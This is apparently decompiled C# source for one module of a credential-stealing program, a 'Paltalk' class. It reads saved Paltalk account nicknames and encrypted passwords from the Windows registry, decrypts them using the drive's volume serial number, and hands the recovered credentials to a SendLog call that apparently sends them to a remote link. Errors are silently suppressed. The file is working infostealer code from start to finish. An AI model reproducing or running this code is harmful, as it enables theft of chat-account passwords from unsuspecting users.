using System;
using System.Management;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

internal class Paltalk
{
	public static void Recover()
	{
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0054: Expected O, but got Unknown
		checked
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Paltalk", writable: false);
				if (registryKey == null)
				{
					return;
				}
				string[] subKeyNames = registryKey.GetSubKeyNames();
				string text = Strings.Left(Conversions.ToString(registryKey.GetValue("InstallerAppDir")), 2);
				ManagementObject val = new ManagementObject("Win32_LogicalDisk.DeviceID=\"" + text + "\"");
				PropertyData val2 = ((ManagementBaseObject)val).get_Properties().get_Item("VolumeSerialNumber");
				int num = 0;
				int num2 = 0;
				string text2 = val2.get_Value().ToString();
				string[] array = subKeyNames;
				for (int i = 0; i < array.Length; i++)
				{
					num2++;
				}
				string[] array2 = new string[num2 - 1 + 1];
				string text3 = ":___:";
				string[] array3 = subKeyNames;
				foreach (string text4 in array3)
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Paltalk\\" + text4, writable: false);
					array2[num] = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(registryKey2.GetValue("nickname"), (object)text3), registryKey2.GetValue("pwd")));
					num++;
				}
				string text5 = null;
				string text6 = null;
				int num3 = num2 - 1;
				for (int k = 0; k <= num3; k++)
				{
					text6 = Strings.Split(array2[k], text3, -1, (CompareMethod)0)[0];
					string text7 = Strings.Split(array2[k], text3, -1, (CompareMethod)0)[1];
					string text8 = null;
					string text9 = null;
					int num4 = text6.Length + text2.Length - 1;
					for (int l = 0; l <= num4; l++)
					{
						if (l < text6.Length)
						{
							text8 += Conversions.ToString(text6[l]);
						}
						if (l < text2.Length)
						{
							text8 += Conversions.ToString(text2[l]);
						}
					}
					text9 = text8;
					while ((double)text7.Length / 2.0 > (double)text9.Length)
					{
						text9 += text8;
					}
					string[] array4 = new string[text7.Length + 1];
					int num5 = (int)Math.Round((double)text7.Length / 4.0 - 1.0);
					for (int m = 0; m <= num5; m++)
					{
						array4[m] = get3(text7, m * 4);
					}
					int num6 = (int)Math.Round((double)text7.Length / 4.0 - 1.0);
					for (int n = 0; n <= num6; n++)
					{
						int b = Conversions.ToInteger(get3(text7, n * 4));
						if (n < 1)
						{
							string text10 = Conversions.ToString(Get_Int(text9, b));
							text5 += Conversions.ToString(Strings.ChrW(Conversions.ToInteger(text10)));
						}
						else
						{
							text5 += Conversions.ToString(Strings.ChrW((int)Math.Round(Conversions.ToDouble(array4[n]) - (double)unchecked((int)text9[checked(n - 1)]) - (double)n - 122.0)));
						}
					}
				}
				string host = " ";
				string username = text6;
				string password = text5;
				Send.SendLog(Camera.P_Link, "Passwords", null, null, "Paltalk", host, username, password, null);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static int Get_Int(string A, int B)
	{
		checked
		{
			return B - unchecked((int)A[checked(A.Length - 1)]) - 122;
		}
	}

	private static string get3(string str, int startIndx)
	{
		string text = null;
		checked
		{
			int num = startIndx + 2;
			for (int i = startIndx; i <= num; i++)
			{
				text += Conversions.ToString(str[i]);
			}
			return text;
		}
	}
}
